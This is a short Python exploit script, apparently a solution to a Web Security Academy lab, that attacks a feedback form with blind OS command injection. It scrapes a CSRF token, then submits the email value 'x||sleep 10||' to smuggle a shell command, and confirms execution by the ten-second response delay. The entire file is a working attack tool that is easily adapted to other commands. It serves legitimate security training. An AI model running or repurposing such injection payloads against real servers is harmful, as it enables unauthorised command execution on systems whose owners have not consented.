import sys
import requests
from bs4 import BeautifulSoup
from requests.adapters import HTTPAdapter, Retry



def get_csrf_token(url, session):
    response = session.get(f"{url}/feedback", timeout=10)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")
        csrf_token = soup.find("input", {"name": "csrf"})["value"]
        return csrf_token


def execute_command(url, session):
    csrf_token = get_csrf_token(url, session)
    data = {
            "csrf": csrf_token,
            "name": "x",
            "email": "x||sleep 10||",
            "subject": "x",
            "message": "x"
            }
    response = session.post(f"{url}/feedback/submit", data=data, timeout=20)
    return response.elapsed.total_seconds() >= 10


def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: python3 {sys.argv[0]} <URL>")
        print(f"(+) Example: python3 {sys.argv[0]} https://0a54001c03544eff826c97940016002a.web-security-academy.net")
        sys.exit(1)

    try:
        url = sys.argv[1].rstrip("/")
        session = requests.Session()
        session.mount("https://", HTTPAdapter(max_retries=Retry(total=3, backoff_factor=0.1)))

        print("(+) Executing the command \"sleep 10\"...")
        if execute_command(url, session):
            print(f"(+) Command successfully executed.")
        else:
            print("(-) Something went wrong, please check your URL and try again.")

    except requests.exceptions.Timeout:
        print("(-) Request timed out.")

    except requests.exceptions.MissingSchema:
        print("(-) Please enter a valid URL.")

    except requests.exceptions.ConnectionError:
        print("(-) Unable to connect to host. Please check your URL and try again.")


if __name__ == "__main__":
    main()